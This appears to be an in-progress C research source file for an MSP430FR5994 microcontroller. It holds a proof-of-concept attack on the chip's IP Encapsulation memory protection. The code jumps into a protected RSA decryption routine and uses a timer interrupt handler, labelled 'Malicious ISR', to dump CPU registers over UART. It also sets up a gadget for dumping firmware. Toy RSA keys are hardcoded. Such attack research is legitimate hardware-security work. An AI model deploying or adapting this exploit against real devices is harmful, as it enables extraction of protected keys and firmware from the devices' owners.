/***************
 STILL IN PRIGRESS
 Comments are left in places where it needs work one.
 Those comments will be removed once relevant information is filled.
 ***************/

/** need to choose which RSA implementation to run **/
//#define tiny_rsa
#define codebase
//#define navin
//#define bearssl_rsa
//#define mbedtls_rsa

/** need to uncomment if the board you are using is MSP432P401R **/
//#define msp432p401r
#define msp430fr5994
//#define riscv

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "pmm.h"
#include "cs.h"
#include "wdt_a.h"
#include "timer_b.h"
#include "sfr.h"
#include "gpio.h"
#include "eusci_a_uart.h"

/// DO NOT EDIT BELOW  //////////////////////////////////////////
#ifdef msp432p401r
#include "msp.h"
#include "rom_map.h"
#include "rom.h"
#include "systick.h"
#endif

#ifdef msp430g2553
#include "msp430.h"
#endif

#ifdef msp430fr5994
#include "msp430.h"
#endif

//#include "experiment_time.h"

#ifdef tiny_rsa
#include "tiny_rsa/rsa_test.h"
#endif
#ifdef codebase
#include "codebase/rsa.h"
#endif
#ifdef navin
#include "navin/rsa.h"
#endif
#ifdef bearssl_rsa
#include "bearssl/bearssl.h"
#include "bearssl/inner.h"
#include "bearssl/bearssl_rsa.h"
#endif
#ifdef  mbedtls_rsa
#include <rsa/mbedtls-copy/pk.h>
#endif

/** Globals (test inputs) **/
//define the global variables here
/***
#ifdef mbedtls_rsa

char resultBuffer[8192];
char public[] =
        "a15f36fc7f8d188057fc51751962a5977118fa2ad4ced249c039ce36c8d1bd275273f1edd821892fa75680b1ae38749fff9268bf06b3c2af02bbdb52a0d05c2ae2384aa1002391c4b16b87caea8296cfd43757bb51373412e8fe5df2e56370505b692cf8d966e3f16bc62629874a0464a9710e4a0718637a68442e0eb1648ec5";
char private[] =
        "3f5cc8956a6bf773e598604faf71097e265d5d55560c038c0bdb66ba222e20ac80f69fc6f93769cb795440e2037b8d67898d6e6d9b6f180169fc6348d5761ac9e81f6b8879529bc07c28dc92609eb8a4d15ac4ba3168a331403c689b1e82f62518c38601d58fd628fcb7009f139fb98e61ef7a23bee4e3d50af709638c24133d";
char cipher[] =
        "1cb1c5e45e584cb1b627cac7b0de0812dac7c1d1638785a7660f6772d219f62aa0ce3e8a853abadebe0a293d76a17d321da8b1fd25ddf807ce96006f73a0aed014b990d6025c42b6c216d8553b66e724270b6dbd654d55e368edeacbc8da30f0cbe5ccbb72a3fe44d29543a5bbb5255a404234ce53bf70f52a78170685a6e391";
int plaintext = 54321;

#endif
#ifdef tiny_rsa

char resultBuffer[8192];
char public[] =
        "a15f36fc7f8d188057fc51751962a5977118fa2ad4ced249c039ce36c8d1bd275273f1edd821892fa75680b1ae38749fff9268bf06b3c2af02bbdb52a0d05c2ae2384aa1002391c4b16b87caea8296cfd43757bb51373412e8fe5df2e56370505b692cf8d966e3f16bc62629874a0464a9710e4a0718637a68442e0eb1648ec5";
char private[] =
        "3f5cc8956a6bf773e598604faf71097e265d5d55560c038c0bdb66ba222e20ac80f69fc6f93769cb795440e2037b8d67898d6e6d9b6f180169fc6348d5761ac9e81f6b8879529bc07c28dc92609eb8a4d15ac4ba3168a331403c689b1e82f62518c38601d58fd628fcb7009f139fb98e61ef7a23bee4e3d50af709638c24133d";
char cipher[] =
        "1cb1c5e45e584cb1b627cac7b0de0812dac7c1d1638785a7660f6772d219f62aa0ce3e8a853abadebe0a293d76a17d321da8b1fd25ddf807ce96006f73a0aed014b990d6025c42b6c216d8553b66e724270b6dbd654d55e368edeacbc8da30f0cbe5ccbb72a3fe44d29543a5bbb5255a404234ce53bf70f52a78170685a6e391";
int plaintext = 54321;

#endif
***/
#ifdef codebase

uint64_t plaintext __attribute__((section(".ipe_vars"))) = 54321;
uint64_t cipher __attribute__((section(".ipe_vars"))) = 351159;
uint64_t rsaDecrypted __attribute__((section(".ipe_vars")));
uint64_t rsaEncrypted __attribute__((section(".ipe_vars")));
#endif
/***
#ifdef navin

uint64_t resultBuffer[1024];
char public[] =
        "a15f36fc7f8d188057fc51751962a5977118fa2ad4ced249c039ce36c8d1bd275273f1edd821892fa75680b1ae38749fff9268bf06b3c2af02bbdb52a0d05c2ae2384aa1002391c4b16b87caea8296cfd43757bb51373412e8fe5df2e56370505b692cf8d966e3f16bc62629874a0464a9710e4a0718637a68442e0eb1648ec5";
char private[] =
        "3f5cc8956a6bf773e598604faf71097e265d5d55560c038c0bdb66ba222e20ac80f69fc6f93769cb795440e2037b8d67898d6e6d9b6f180169fc6348d5761ac9e81f6b8879529bc07c28dc92609eb8a4d15ac4ba3168a331403c689b1e82f62518c38601d58fd628fcb7009f139fb98e61ef7a23bee4e3d50af709638c24133d";
char ciphertext[] =
        "1cb1c5e45e584cb1b627cac7b0de0812dac7c1d1638785a7660f6772d219f62aa0ce3e8a853abadebe0a293d76a17d321da8b1fd25ddf807ce96006f73a0aed014b990d6025c42b6c216d8553b66e724270b6dbd654d55e368edeacbc8da30f0cbe5ccbb72a3fe44d29543a5bbb5255a404234ce53bf70f52a78170685a6e391";
uint8_t plaintext[] = {5, 4, 3, 2, 1};

#endif
#ifdef bearssl_rsa

/*
 * Test vectors from pkcs-1v2-1d2-vec.zip (originally from ftp.rsa.com).
 * There are ten RSA keys, and for each RSA key, there are 6 messages,
 * each with an explicit seed.
 *
static const char *KAT_RSA_OAEP[] =
{
 /* 1024-bit key, from oeap-int.txt *
 //public key
 "BBF82F090682CE9C2338AC2B9DA871F7368D07EED41043A440D6B6F07454F51FB8DFBAAF035C02AB61EA48CEEB6FCD4876ED520D60E1EC4619719D8A5B8B807FAFB8E0A3DFC737723EE6B4B7D93A2584EE6A649D060953748834B2454598394EE0AAB12D7B61A51F527A9A41F6C1687FE2537298CA2A8F5946F8E5FD091DBDCB",
 "11",
 //private
 "EECFAE81B1B9B3C908810B10A1B5600199EB9F44AEF4FDA493B81A9E3D84F632124EF0236E5D1E3B7E28FAE7AA040A2D5B252176459D1F397541BA2A58FB6599",
 "C97FB1F027F453F6341233EAAAD1D9353F6C42D08866B1D05A0F2035028B9D869840B41666B42E92EA0DA3B43204B5CFCE3352524D0416A5A441E700AF461503",
 "54494CA63EBA0337E4E24023FCD69A5AEB07DDDC0183A4D0AC9B54B051F2B13ED9490975EAB77414FF59C1F7692E9A2E202B38FC910A474174ADC93C1F67C981",
 "471E0290FF0AF0750351B7F878864CA961ADBD3A8A7E991C5C0556A94C3146A7F9803F8F6F8AE342E931FD8AE47A220D1B99A495849807FE39F9245A9836DA3D",
 "B06C4FDABB6301198D265BDBAE9423B380F271F73453885093077FCD39E2119FC98632154F5883B167A967BF402B4E9E2E0F9656E698EA3666EDFB25798039F7",

 /* oaep-int.txt contains only one message, so we repeat it six
           times to respect our array format. *

 //plain text
 "D436E99569FD32A7C8A05BBC90D32C49",
 // seed
 "AAFD12F659CAE63489B479E5076DDEC2F06CB58F",
 //cipher text
 "1253E04DC0A5397BB44A7AB87E9BF2A039A33D1E996FC82A94CCD30074C95DF763722017069E5268DA5D1C0B4F872CF653C11DF82314A67968DFEAE28DEF04BB6D84B1C31D654A1970E5783BD6EB96A024C2CA2F4A90FE9F2EF5C9C140E5BB48DA9536AD8700C84FC9130ADEA74E558D51A74DDF85D8B50DE96838D6063E0955",

 NULL };

unsigned char resultBuffer[1024];
unsigned char plain[512], seed[128], cipher[512];
size_t check_result_len;

#endif
***/
/** Initialization for different RSA implementations **/
/***
#ifdef tiny_rsa
// Nothing needs to be done.
#endif
***/
#ifdef codebase

// Values based on 64-bit math (huge_t = uint64_t)
// which will result in more secure encryption, but also
// increases the size of the encrypted text

rsaPubKey_t publicKey __attribute__((section(".ipe_const"))) = {21, 16484947};
rsaPriKey_t privateKey __attribute__((section(".ipe_const"))) = {15689981, 16484947};

//publicKey.e = 21;
//publicKey.n = 16484947;
//privateKey.d = 15689981;
//privateKey.n = 16484947;
#endif
/***
#ifdef navin
// Nothing needs to be done.
#endif
#ifdef bearssl_rsa

static size_t hextobin(unsigned char *dst, const char *src)
{
    size_t num;
    unsigned acc;
    int z;

    num = 0;
    z = 0;
    acc = 0;
    while (*src != 0)
    {
        int c = *src++;
        if (c >= '0' && c <= '9')
        {
            c -= '0';
        }
        else if (c >= 'A' && c <= 'F')
        {
            c -= ('A' - 10);
        }
        else if (c >= 'a' && c <= 'f')
        {
            c -= ('a' - 10);
        }
        else
        {
            continue;
        }
        if (z)
        {
            *dst++ = (acc << 4) + c;
            num++;
        }
        else
        {
            acc = c;
        }
        z = !z;
    }
    return num;
}

// Fake RNG that returns exactly the provided bytes.
typedef struct
{
    const br_prng_class *vtable;
    unsigned char buf[128];
    size_t ptr, len;
} rng_fake_ctx;

static void rng_fake_init(rng_fake_ctx *cc, const void *params,
                          const void *seed, size_t len);
static void rng_fake_generate(rng_fake_ctx *cc, void *dst, size_t len);
static void rng_fake_update(rng_fake_ctx *cc, const void *src, size_t len);

static const br_prng_class rng_fake_vtable =
{ sizeof(rng_fake_ctx),
  (void (*)(const br_prng_class**, const void*, const void*, size_t)) &rng_fake_init,
  (void (*)(const br_prng_class**, void*, size_t)) &rng_fake_generate,
  (void (*)(const br_prng_class**, const void*, size_t)) &rng_fake_update };

static void rng_fake_init(rng_fake_ctx *cc, const void *params,
                          const void *seed, size_t len)
{
    (void) params;
    if (len > sizeof cc->buf)
    {
        fprintf(stderr, "seed is too large (%lu bytes)\n", (unsigned long) len);
        exit(EXIT_FAILURE);
    }
    cc->vtable = &rng_fake_vtable;
    memcpy(cc->buf, seed, len);
    cc->ptr = 0;
    cc->len = len;
}

static void rng_fake_generate(rng_fake_ctx *cc, void *dst, size_t len)
{
    if (len > (cc->len - cc->ptr))
    {
        fprintf(stderr, "asking for more data than expected\n");
        exit(EXIT_FAILURE);
    }
    memcpy(dst, cc->buf + cc->ptr, len);
    cc->ptr += len;
}

static void rng_fake_update(rng_fake_ctx *cc, const void *src, size_t len)
{
    (void) cc;
    (void) src;
    (void) len;
    fprintf(stderr, "unexpected update\n");
    exit(EXIT_FAILURE);
}

#endif
***/

__attribute__((section(".ipe_code"))) void test_encrypt(void);
void test_encrypt()
{
/***
#ifdef tiny_rsa
    rsa1024_encrypt(public, private, resultBuffer, plaintext);
#endif
***/
#ifdef codebase
    rsaEncrypt(plaintext, &rsaEncrypted, publicKey);
#endif
/***
#ifdef navin
    uint64_t e[18] = {0};
    e[0] = 65537;

    rsa1024(resultBuffer, plaintext, public, e);
#endif
#ifdef bearssl_rsa

    size_t u;
    u = 0;

    unsigned char n[512];
    unsigned char e[8];
    unsigned char p[256];
    unsigned char q[256];
    unsigned char dp[256];
    unsigned char dq[256];
    unsigned char iq[256];
    br_rsa_public_key pk;
    br_rsa_private_key sk;
    size_t v;

    pk.n = n;
    pk.nlen = hextobin(n, KAT_RSA_OAEP[u++]);
    pk.e = e;
    pk.elen = hextobin(e, KAT_RSA_OAEP[u++]);

    for (v = 0; n[v] == 0; v++)
        ;
    sk.n_bitlen = BIT_LENGTH(n[v]) + ((pk.nlen - 1 - v) << 3);
    sk.p = p;
    sk.plen = hextobin(p, KAT_RSA_OAEP[u++]);
    sk.q = q;
    sk.qlen = hextobin(q, KAT_RSA_OAEP[u++]);
    sk.dp = dp;
    sk.dplen = hextobin(dp, KAT_RSA_OAEP[u++]);
    sk.dq = dq;
    sk.dqlen = hextobin(dq, KAT_RSA_OAEP[u++]);
    sk.iq = iq;
    sk.iqlen = hextobin(iq, KAT_RSA_OAEP[u++]);

    size_t plain_len, seed_len, cipher_len;
    rng_fake_ctx rng;

    plain_len = hextobin(plain, KAT_RSA_OAEP[u++]);
    seed_len = hextobin(seed, KAT_RSA_OAEP[u++]);
    cipher_len = hextobin(cipher, KAT_RSA_OAEP[u++]);
    rng_fake_init(&rng, NULL, seed, seed_len);

    br_rsa_i15_oaep_encrypt(&rng.vtable, &br_sha1_vtable, NULL, 0, &pk, resultBuffer, sizeof resultBuffer, plain, plain_len);

#endif
#ifdef mbedtls_rsa
    size_t olen = 0;

    mbedtls_pk_context pk;
    mbedtls_pk_init( &pk );
    mbedtls_pk_parse_public_keyfile( &pk, "our-key.pub" );

    mbedtls_pk_encrypt( &pk, plaintext, sizeof(plaintext),
                        resultBuffer, &olen, sizeof(resultBuffer),
                        NULL, NULL );
#endif
***/
}

__attribute__((section(".ipe_code"))) void test_decrypt(void);
void test_decrypt()
{

__bic_SR_register(GIE);
__no_operation();

/***
#ifdef tiny_rsa
    rsa1024_decrypt(public, private, resultBuffer, cipher);
#endif
***/
#ifdef codebase
    rsaDecrypt(cipher, &rsaDecrypted, privateKey);
#endif
/***
#ifdef navin
    uint64_t e[18] = {0};
    e[0] = 65537;

    rsa1024(resultBuffer, ciphertext, private, e);
#endif
#ifdef bearssl_rsa

    size_t u;
    u = 0;

    unsigned char n[512];
    unsigned char e[8];
    unsigned char p[256];
    unsigned char q[256];
    unsigned char dp[256];
    unsigned char dq[256];
    unsigned char iq[256];
    br_rsa_public_key pk;
    br_rsa_private_key sk;
    size_t v;

    pk.n = n;
    pk.nlen = hextobin(n, KAT_RSA_OAEP[u++]);
    pk.e = e;
    pk.elen = hextobin(e, KAT_RSA_OAEP[u++]);

    for (v = 0; n[v] == 0; v++)
        ;
    sk.n_bitlen = BIT_LENGTH(n[v]) + ((pk.nlen - 1 - v) << 3);
    sk.p = p;
    sk.plen = hextobin(p, KAT_RSA_OAEP[u++]);
    sk.q = q;
    sk.qlen = hextobin(q, KAT_RSA_OAEP[u++]);
    sk.dp = dp;
    sk.dplen = hextobin(dp, KAT_RSA_OAEP[u++]);
    sk.dq = dq;
    sk.dqlen = hextobin(dq, KAT_RSA_OAEP[u++]);
    sk.iq = iq;
    sk.iqlen = hextobin(iq, KAT_RSA_OAEP[u++]);

    size_t plain_len, seed_len, cipher_len;
    rng_fake_ctx rng;

    plain_len = hextobin(plain, KAT_RSA_OAEP[u++]);
    seed_len = hextobin(seed, KAT_RSA_OAEP[u++]);
    cipher_len = hextobin(cipher, KAT_RSA_OAEP[u++]);
    rng_fake_init(&rng, NULL, seed, seed_len);

    for(int i = 0; i < sizeof(plain); i++) {
        resultBuffer[i] = plain[i];
    }

    br_rsa_i15_oaep_decrypt(&br_sha1_vtable, NULL, 0, &sk, resultBuffer, sizeof resultBuffer);

#endif
#ifdef mbedtls_rsa
    size_t olen = 0;

    mbedtls_pk_context pk;
    mbedtls_pk_init( &pk );
    mbedtls_pk_parse_public_keyfile( &pk, "our-key.prv" );

    mbedtls_pk_decrypt( &pk, plaintext, sizeof(plaintext),
                        resultBuffer, &olen, sizeof(resultBuffer),
                        NULL, NULL );
#endif
***/

__bis_SR_register(GIE);
__no_operation();

/*
 * Clear General purpose CPU registers R4-R15
 */
__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");
}

/***
int check_encrypt()
{
#if defined(tiny_rsa)
    return memcmp((char*) cipher, (char*) resultBuffer, sizeof(cipher));
#elif defined(bearssl_rsa)
    return memcmp((char*) cipher, (char*) resultBuffer, sizeof(cipher));
#elif defined(codebase)
    return (cipher == rsaEncrypted);
#elif defined(navin)
    return memcmp((char*) cipher, (char*) resultBuffer, sizeof(cipher));
#endif
}

int check_decrypt()
{
#if defined(tiny_rsa)
    return memcmp((char*) plaintext, (char*) resultBuffer, sizeof(plaintext));
#elif defined(bearssl_rsa)
    return memcmp((char*) plain, (char*) resultBuffer, sizeof(plain));
#elif defined(codebase)
    return (plaintext == rsaDecrypted);
#elif defined(navin)
    return memcmp((char*) plaintext, (char*) resultBuffer, sizeof(plaintext));
#endif
}
***/

int check_reset __attribute__((section(".persistent"))) = 0;
volatile unsigned int COMPARE_VALUE __attribute__((section(".persistent"))) = 0;
volatile unsigned int IPE_ADDRESS __attribute__((section(".persistent"))) = 16380;

__attribute__((naked)) void increment_timer_count(void);
void increment_timer_count() {
    __asm__ __volatile__ ("inc &COMPARE_VALUE");
    __asm__ __volatile__ ("reta");
}

__attribute__((naked)) void IOP_gadget(void);
void IOP_gadget() {
    //__asm__ __volatile__ ("incx &0xf000");
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("mov &0xf000,R14");
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("bra #0x413a");
    __asm__ __volatile__ ("reta");
}

int main(void)
{
/***
#ifdef msp432p401r
    /** Initialize the board **
    //board_init();

    /** Starting the timer to measure elapsed time **
    //startTimer();
#endif
***/

#ifdef msp430fr5994
    /** Initialize the board **/
    WDTCTL = WDTPW | WDTHOLD;
#endif

    if(check_reset == 0)
    {
        ++check_reset;
        PMM_trigBOR();
    }

    //COMPARE_VALUE++;
    increment_timer_count();

    //Set DCO Frequency to 1MHz
    CS_setDCOFreq(CS_DCORSEL_0,CS_DCOFSEL_0);

    //Set MCLK = SMCLK = DCO Frequency
    CS_initClockSignal(CS_SMCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);
    CS_initClockSignal(CS_MCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);

    // Configure UART pin
    //Set P2.0 as Secondary Module Function Input.

    //Select Port 2d
    //Set Pin 0 to input Secondary Module Function, (UCA0TXD/UCA0SIMO).

    GPIO_setAsPeripheralModuleFunctionInputPin(
    GPIO_PORT_P2,
    GPIO_PIN0,
    GPIO_SECONDARY_MODULE_FUNCTION
    );

    // Disable the GPIO power-on default high-impedance mode to activate
    // previously configured port settings
    PM5CTL0 &= ~LOCKLPM5;          //turn on I/O

    // Configure UART
    EUSCI_A_UART_initParam param = {0};
    param.selectClockSource = EUSCI_A_UART_CLOCKSOURCE_SMCLK;
    param.clockPrescalar = 8;
    param.firstModReg = 0;
    param.secondModReg = 0xD6;
    param.parity = EUSCI_A_UART_NO_PARITY;
    param.msborLsbFirst = EUSCI_A_UART_LSB_FIRST;
    param.numberofStopBits = EUSCI_A_UART_ONE_STOP_BIT;
    param.uartMode = EUSCI_A_UART_MODE;
    param.overSampling = EUSCI_A_UART_LOW_FREQUENCY_BAUDRATE_GENERATION;

    if (STATUS_FAIL == EUSCI_A_UART_init(EUSCI_A0_BASE, &param)) {
        return;
    }

    EUSCI_A_UART_enable(EUSCI_A0_BASE);

    /*set timer_B_parameters*/

    //Start timer in continuous mode sourced by SMCLK
    Timer_B_initContinuousModeParam initContParam = {0};
    initContParam.clockSource = TIMER_B_CLOCKSOURCE_SMCLK;
    initContParam.clockSourceDivider = TIMER_B_CLOCKSOURCE_DIVIDER_1;
    initContParam.timerInterruptEnable_TBIE = TIMER_B_TBIE_INTERRUPT_DISABLE;
    initContParam.timerClear = TIMER_B_DO_CLEAR;
    initContParam.startTimer = false;
    Timer_B_initContinuousMode(TIMER_B0_BASE, &initContParam);

    //Initiaze compare mode
    Timer_B_clearCaptureCompareInterrupt(TIMER_B0_BASE,
        TIMER_B_CAPTURECOMPARE_REGISTER_0);

    Timer_B_initCompareModeParam initCompParam = {0};
    initCompParam.compareRegister = TIMER_B_CAPTURECOMPARE_REGISTER_0;
    initCompParam.compareInterruptEnable = TIMER_B_CAPTURECOMPARE_INTERRUPT_ENABLE;
    initCompParam.compareOutputMode = TIMER_B_OUTPUTMODE_OUTBITVALUE;
    initCompParam.compareValue = COMPARE_VALUE;
    Timer_B_initCompareMode(TIMER_B0_BASE, &initCompParam);

    Timer_B_startCounter( TIMER_B0_BASE,
        TIMER_B_CONTINUOUS_MODE
        );

    //enable interrupts
    __bis_SR_register(GIE);       //need to enable LPM0 for timer_a to work properly
    __no_operation();

    /*** Setup for fimrware dump IOP gadget ***/
    
    IOP_gadget();
    
    /*** End of setup ***/

    /** test rsa **/
//    test_encrypt();
//    test_decrypt();
    __asm__ __volatile__ ("suba #4,SP");
    __asm__ __volatile__ ("mova PC,R15");
    __asm__ __volatile__ ("adda #22,R15");
    __asm__ __volatile__ ("mova R15,@SP");
    __asm__ __volatile__ ("mova #test_decrypt,R14");
    __asm__ __volatile__ ("adda #8,R14");
    //__asm__ __volatile__ ("pushm.a #3,R10");         //to account for prologue of test_decrypt function
    __asm__ __volatile__ ("suba #0x00008,SP");       //to account for prologue of test_decrypt function
    __asm__ __volatile__ ("bra R14");

    /** Check the result to see whether RSA algorithm is correctly working or not **/
//    volatile unsigned int verify = check_encrypt();
//    volatile unsigned int verify = check_decrypt();

//#ifdef msp432p401r
    //volatile unsigned int elapsed = getElapsedTime();
//#endif

    //while (1);
    return 1;
}

/* Malicious ISR
 *
 * This ISR doesn't corrupt the register file,
 * besides PC,SP and SR which it is picking from
 * the stack.
 */
volatile unsigned int DUMP_START[16] __attribute__((section(".altfram")));
void __attribute__((interrupt(TIMERB0_VECTOR),naked)) TIMERB0_ISR (void)
{
    //Saving Register States
    __asm(" addx #2, SP");
    __asm(" movx @SP, &DUMP_START");         //storing the PC
    __asm(" addx #2, SP");
    __asm(" movx SP, &DUMP_START+2");       //storing the SP
    __asm(" subx #4, SP");
    __asm(" movx @SP, &DUMP_START+4");      //storing the SR
    __asm(" movx R3, &DUMP_START+6");
    __asm(" movx R4, &DUMP_START+8");
    __asm(" movx R5, &DUMP_START+10");
    __asm(" movx R6, &DUMP_START+12");
    __asm(" movx R7, &DUMP_START+14");
    __asm(" movx R8, &DUMP_START+16");
    __asm(" movx R9, &DUMP_START+18");
    __asm(" movx R10, &DUMP_START+20");
    __asm(" movx R11, &DUMP_START+22");
    __asm(" movx R12, &DUMP_START+24");
    __asm(" movx R13, &DUMP_START+26");
    __asm(" movx R14, &DUMP_START+28");
    __asm(" movx R15, &DUMP_START+30");


    //UART TX Routine Start

    //not adding delay before next package (16 register states) Tx, as interrupt latency will handle that
    /*__asm(" mov #1000, R7");
    __asm(" big_start:  cmp #0,R7");
    __asm(" jz big_end");
    __asm(" dec R7");
    __asm(" jmp big_start");*/

    __asm(" mova #0, R14");
    __asm(" mov #16, R11");
    __asm(" serial_start:  cmp #0,R11");
    __asm(" jz serial_end");
    __asm(" mova #0x005CE, R12");                     //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10001(R14), 0x00000(R12)");

    //add delay before next byte Tx
    __asm(" mov #15, R9");
    __asm(" inner_start:  cmp #0,R9");
    __asm(" jz inner_end");
    __asm(" dec R9");
    __asm(" jmp inner_start");

    __asm(" inner_end: mova #0x005CE, R12");         //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10000(R14), 0x00000(R12)");

    //add delay before next word (2 bytes) Tx
    __asm(" mov #15, R10");
    __asm(" outer_start:  cmp #0,R10");
    __asm(" jz outer_end");
    __asm(" dec R10");
    __asm(" jmp outer_start");

    __asm(" outer_end: incdx.a R14");
    __asm(" dec R11");
    __asm(" jmp serial_start");
    //UART TX Routine End

    //Restoring PC, SP and SR
    __asm(" serial_end: mova #0x02BFC, SP");
    __asm(" nop ");
    __asm(" mova #0x00003, SR");
    __asm(" nop ");
    __asm(" bra #main");
    __asm__ __volatile__ ("capture_isr: jmp capture_isr");
}

#define IPE_SIG_VALID 0xFF88
// IPE signature valid flag
#define IPE_STR_PTR_SRC 0xFF8A
// Source for pointer (nibble address) to MPU IPE structure
//#pragma RETAIN(ipe_signalValid)
//#pragma location=IPE_SIG_VALID
const unsigned int ipe_signalValid __attribute__((retain, section(".ipesignature1"))) = 0xAAAA;
// Locate your IPE structure and it should be placed
// on the top of the IPE memory. In this example, IPE structure
// is at 0xD000
//#pragma RETAIN(IPE_stringPointerSourceSource)
//#pragma location=IPE_STR_PTR_SRC
const unsigned int IPE_stringPointerSourceSource __attribute__((retain, section(".ipesignature2"))) = 0x0400;

// IPE data structures definition, reusable for ALL projects
#define IPE_MPUIPLOCK 0x0080
#define IPE_MPUIPENA 0x0040
#define IPE_MPUIPPUC 0x0020
#define IPE_SEGREG(a) (a >> 4)
#define IPE_BIP(a,b,c) ((a) ^ (b) ^ (c) ^ (0xFFFF))
#define IPE_FILLSTRUCT(a,b,c) {a,IPE_SEGREG(b),IPE_SEGREG(c),IPE_BIP(a,IPE_SEGREG(b),IPE_SEGREG(c))}

typedef struct IPE_Init_Structure {
unsigned int MPUIPC0 ;
unsigned int MPUIPB2 ;
unsigned int MPUIPB1 ;
unsigned int MPUCHECK ;
} IPE_Init_Structure; // this struct should be placed inside IPB1/IPB2 boundaries
// This is the project dependant part
#define IPE_START 0x04000 // This defines the Start of the IP protected area
#define IPE_END 0x0B000 // This defines the End of the IP protected area
// define borders of protected code
// ipestruct is defined in a adopted linker control file
// ipestruct is the section for protected data;
//#pragma RETAIN(ipe_configStructure)
//#pragma DATA_SECTION(ipe_configStructure,".ipestruct");
const IPE_Init_Structure ipe_configStructure __attribute__((retain, section(".ipestruct"))) = IPE_FILLSTRUCT(IPE_MPUIPLOCK + IPE_MPUIPENA, IPE_END,IPE_START);
